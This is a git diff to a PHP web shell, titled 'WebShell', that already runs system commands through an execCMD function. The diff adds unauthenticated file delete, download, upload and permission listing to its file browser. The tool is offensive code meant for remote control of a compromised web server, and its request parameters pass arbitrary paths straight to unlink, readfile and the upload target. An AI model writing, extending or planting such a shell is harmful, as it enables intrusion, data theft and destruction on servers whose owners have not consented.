@@ -8,6 +8,55 @@ function showContent($file) {
     }
 }
 
+// File / Folder permissions
+function printPerms($file) {
+	$mode = fileperms($file);
+	if( $mode & 0x1000 ) { $type='p'; }
+	else if( $mode & 0x2000 ) { $type='c'; }
+	else if( $mode & 0x4000 ) { $type='d'; }
+	else if( $mode & 0x6000 ) { $type='b'; }
+	else if( $mode & 0x8000 ) { $type='-'; }
+	else if( $mode & 0xA000 ) { $type='l'; }
+	else if( $mode & 0xC000 ) { $type='s'; }
+	else $type='u';
+	$owner["read"] = ($mode & 00400) ? 'r' : '-';
+	$owner["write"] = ($mode & 00200) ? 'w' : '-';
+	$owner["execute"] = ($mode & 00100) ? 'x' : '-';
+	$group["read"] = ($mode & 00040) ? 'r' : '-';
+	$group["write"] = ($mode & 00020) ? 'w' : '-';
+	$group["execute"] = ($mode & 00010) ? 'x' : '-';
+	$world["read"] = ($mode & 00004) ? 'r' : '-';
+	$world["write"] = ($mode & 00002) ? 'w' : '-';
+	$world["execute"] = ($mode & 00001) ? 'x' : '-';
+	if( $mode & 0x800 ) $owner["execute"] = ($owner['execute']=='x') ? 's' : 'S';
+	if( $mode & 0x400 ) $group["execute"] = ($group['execute']=='x') ? 's' : 'S';
+	if( $mode & 0x200 ) $world["execute"] = ($world['execute']=='x') ? 't' : 'T';
+	$s=sprintf("%1s", $type);
+	$s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']);
+	$s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']);
+	$s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);
+	return $s;
+}
+
+// Delete
+function rrmdir($dir) { 
+ if (is_dir($dir)) { 
+   $objects = scandir($dir);
+   foreach ($objects as $object) { 
+     if ($object != "." && $object != "..") { 
+       if (is_dir($dir. DIRECTORY_SEPARATOR .$object) && !is_link($dir."/".$object))
+         rrmdir($dir. DIRECTORY_SEPARATOR .$object);
+       else
+         @unlink($dir. DIRECTORY_SEPARATOR .$object); 
+     } 
+   }
+   @rmdir($dir); 
+ }else{
+  @unlink($dir); 
+ }
+ header('Location:'.$_SERVER['PHP_SELF']);
+}
+
 // Exec cmd 
 function execCMD( $cmd ){
   if(function_exists('system')){
@@ -54,11 +103,57 @@ function actionCMD($action){
 function actionExplorer(){
   $dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
   $files = scandir($dir);
+  
   if (isset($_GET['file'])) {
     $file = $_GET['file'];
     $content = showContent($file);
   }
+
+  // Delete File/Directory
+  if (isset($_GET['delete'])) {
+    $file = $_GET['delete'];
+    rrmdir($file);
+  }
+
+  // Download File
+  if (isset($_GET['download'])) {
+    $file = $_GET['download'];
+    if (file_exists($file)) {
+        header('Content-Description: File Transfer');
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="'.basename($file).'"');
+        header('Expires: 0');
+        header('Cache-Control: must-revalidate');
+        header('Pragma: public');
+        header('Content-Length: ' . filesize($file));
+        readfile($file);
+        exit;
+    }
+  }
+
+  // Upload File
   if (!isset($content)):
+    if (isset($_POST['submit'])) {
+      $uploadDirectory = $dir.'/'.basename($_FILES['fileToUpload']['name']);
+      if (file_exists($uploadDirectory)) {
+          echo "<br><br><strong style='color:red'>Error. File already exists in ".$uploadDirectory.".</strong></br></br>";
+      }
+      else if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $uploadDirectory)) {
+        echo '<br><br><strong>File '.$_FILES['fileToUpload']['name'].' uploaded successfully in '.$dir.' !</strong><br>';
+      } else {
+        echo '<br><br><strong style="color:red">Error uploading file '.$uploadDirectory.'</strong><br><br>';
+
+      }
+    }
+
+    echo '<div class="upload-file"><form action="'.$_SERVER['PHP_SELF'].'" method="post" enctype="multipart/form-data">';
+    echo '<label><strong>Upload </strong></label>';
+    echo '<input type="hidden" name="dir" value="'.$dir.'"/>';
+    echo '<input type="hidden" name="submit" value="upload-file"/>';
+    echo '<input type="file" name="fileToUpload" id="fileToUpload"><button type="submit">Upload File</button>';
+    echo '</div>';
+
+    // Breadcrumb
     echo '<div class="breadcrumb"><strong>Jump:</strong> ';
     $breadcrumbs = explode('/', $dir);
     $path = '';
@@ -70,20 +165,24 @@ function actionExplorer(){
     }     
     echo  '</div>';
   endif;
-         if (isset($content)):
+    if (isset($content)):
+      // Open File
             echo '<div class="file-content">
                 <h2>File: '. basename($file) .'</h2>
-                <p><a href="?dir='. urlencode(dirname($file)) .'">< Back</a></p>
+                <p><a href="?dir='. urlencode(dirname($file)) .'"><i class="fa-solid fa-angles-left"></i> Back</a></p>
                 <pre style="overflow:auto;" class="result">'. htmlspecialchars($content).'</pre>
-                <p><a href="?dir='. urlencode(dirname($file)).'">< Back</a></p>
+                <p><a href="?dir='. urlencode(dirname($file)).'"><i class="fa-solid fa-angles-left"></i> Back</a></p>
             </div>';
         else:
             echo '<div class="file-browser">
                 <table width="100%">
                   <thead>
                     <tr>
-                        <th style="width: 50%; text-align:left;">Name</th>
-                        <th style="width: 50%; text-align:left;">Type</th>
+                      <th style="text-align:left;">Name</th>
+                      <th style="text-align:left;">Type</th>
+                      <th style="text-align:left;">Owner</th>
+                      <th style="text-align:left;">Permissions</th>
+                      <th>&nbsp;</th>
                     </tr>
                   </thead>
                   <tbody>';
@@ -99,17 +198,27 @@ function actionExplorer(){
                         </tr>';
                     endif;
                     foreach ($files as $file):
-                      if ($file != '.' && $file != '..'):
+                      if ($file != '.' && $file != '..'):                     
                         echo '<tr>
                                 <td>';
                                     if (is_dir($dir . '/' . $file)):
-                                      echo '<a href="?dir='. $dir . '/' . $file .'">'.$file.'</a>';
+                                      echo '<a href="?dir='. $dir . '/' . $file .'"><i class="fa-solid fa-folder"></i> '.$file.'</a>';
                                     else:
-                                      echo '<a href="?file='. $dir . '/' . $file .'">'.$file.'</a>';
+                                      echo '<a href="?file='. $dir . '/' . $file .'"><i class="fa-solid fa-file"></i> '.$file.'</a>';
                                     endif;
                              echo '</td>
-                                <td style="text-align:left">
+                                <td>
                                     '. (is_dir($dir . '/' . $file) ? 'Directory' : 'File') .'
+                                </td>
+                                <td>
+                                    '.(posix_getpwuid(fileowner($dir.'/'.$file))['name']).'
+                                </td>
+                                <td>
+                                    '. (printPerms($dir)) .'
+                                </td>
+                                <td style="text-align:right">
+                                  '. (is_dir($dir . '/' . $file) ? '' : '<a href="?download='.$dir . '/' . $file.'" title="Download File" class="btn-icon"><i class="fa-solid fa-download"></i></a>') .'
+                                  <a href="?delete='.$dir . '/' . $file.'" title="Delete" class="btn-icon"><i class="fa-solid fa-trash"></i></a>
                                 </td>
                             </tr>';
                       endif;
@@ -132,6 +241,7 @@ function actionServerInfo(){
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.5.1/css/all.css">
     <title>WebShell</title>
 <style>
 body {
@@ -150,7 +260,7 @@ a{
 
 input{background-color:#525252; color:#fff;}
 
-button{background-color:#000; border:none; color:#fff; cursor:pointer; padding: 5px 2px;}
+button{background-color:#000; border:none; color:#fff; cursor:pointer; padding: 5px;}
 
 .container {
     max-width: 960px;
@@ -172,6 +282,10 @@ h1 {
   padding:5px;
 }
 
+.upload-file{
+  margin-top:10px;
+}
+
 .file-browser ul {
     list-style: none;
     padding: 0;
@@ -189,6 +303,10 @@ h1 {
 
 .file-browser ul li a:hover {
     text-decoration: underline;
+}
+
+.btn-icon{
+  padding:5px;
 }
 
 .breadcrumb {
@@ -209,7 +327,7 @@ h1 {
 }
 
 thead tr th{
-  text-weight:bold;
+  font-weight:bold;
   background-color:#525252; 
   color:#fff;
   padding:10px;
